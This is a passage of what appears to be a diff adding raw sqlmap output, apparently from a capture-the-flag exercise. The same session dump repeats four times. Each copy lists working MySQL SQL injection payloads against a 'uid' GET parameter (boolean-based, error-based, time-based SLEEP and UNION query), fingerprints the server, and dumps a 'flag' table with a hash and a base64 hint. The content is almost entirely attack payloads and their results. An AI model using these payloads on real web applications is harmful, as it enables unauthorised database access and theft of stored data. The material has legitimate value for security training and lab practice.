+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: flag
+[1 entry]
++-----+----------------------------------+
+| fid | flag                             |
++-----+----------------------------------+
+| 4   | 43e88d8af39ade74a02a92e4587bd500 |
++-----+----------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: flag
+[1 entry]
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+| fid | flag                             | readme                                                                                                                       |
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+| 4   | 43e88d8af39ade74a02a92e4587bd500 | WW91IGNhbid0IGNyYWNoIHRoZSBoYXNoISBhbmQgcGxhaW4gdmFsdWUgaXMgVkFQUiwgeW91IGNhbiB2YWxpZGF0ZSBieSBydW5pbmcgYnJ1dGVmb3JjZSA7KQ== |
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: flag
+[1 entry]
++-----+----------------------------------+
+| fid | flag                             |
++-----+----------------------------------+
+| 4   | 43e88d8af39ade74a02a92e4587bd500 |
++-----+----------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: uid (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: uid=-3916' OR 6091=6091#
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: uid=admin' AND (SELECT 8361 FROM(SELECT COUNT(*),CONCAT(0x716b6b6a71,(SELECT (ELT(8361=8361,1))),0x7178717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BfQY
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: uid=admin' AND SLEEP(5)-- ENEz
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 5 columns
+    Payload: uid=-7297' UNION ALL SELECT NULL,CONCAT(0x716b6b6a71,0x64554f7855575470794946454179447541456b694678524e657968515a51766568634b6c41646e49,0x7178717171),NULL,NULL,NULL#
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.38
+back-end DBMS: MySQL >= 5.0
+Database: dbs
+Table: flag
+[1 entry]
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+| fid | flag                             | readme                                                                                                                       |
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+| 4   | 43e88d8af39ade74a02a92e4587bd500 | WW91IGNhbid0IGNyYWNoIHRoZSBoYXNoISBhbmQgcGxhaW4gdmFsdWUgaXMgVkFQUiwgeW91IGNhbiB2YWxpZGF0ZSBieSBydW5pbmcgYnJ1dGVmb3JjZSA7KQ== |
++-----+----------------------------------+------------------------------------------------------------------------------------------------------------------------------+
+
